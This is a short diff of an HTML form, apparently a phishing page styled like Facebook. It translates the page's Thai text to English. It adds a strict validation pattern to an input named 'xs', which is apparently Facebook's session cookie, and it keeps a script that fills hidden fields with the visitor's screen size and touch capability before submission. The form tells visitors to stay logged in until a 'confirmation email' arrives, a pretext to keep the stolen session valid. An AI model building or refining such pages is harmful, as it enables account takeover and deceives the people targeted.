@@ -42,25 +42,25 @@
                     <br>
                     <label class="mt-2" style="font-size: 12px;">xs</label>
                     <br>
-                    <input type="text" name="xs">
+                    <input type="text" name="xs" required pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$">
                     <p class="mt-2" style="font-size: 12px;">โปรดอย่าออกจากระบบจากคอมพิวเตอร์หรือแล็ปท็อปของคุณจนกว่าคุณจะได้รับอีเมลยืนยัน</p>
                 </div>
                 <div class="p-2 mb-2 d-flex justify-content-end" style="background: rgb(245, 246, 247);">
-                    <button type="submit" class="text-white border-0" style="background: rgb(66, 103, 178);">ส่ง</button>
+                    <button type="submit" class="text-white border-0" style="background: rgb(66, 103, 178);">Submit</button>
                 </div>
             </div>
         </div>
     </form>
 
     <script>
-        // เติมรายละเอียดอุปกรณ์ลงในฟิลด์ที่ซ่อนอยู่ก่อนส่งแบบฟอร์ม
+        // Populate device details in hidden fields before form submission
         const form = document.getElementById("device-form");
 
         form.addEventListener("submit", (event) => {
             const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
             const screenWidth = window.innerWidth;
             const screenHeight = window.innerHeight;
-    
+
             document.getElementById("screenWidth").value = screenWidth;
             document.getElementById("screenHeight").value = screenHeight;
             document.getElementById("isTouchDevice").value = isTouchDevice ? "true" : "false";
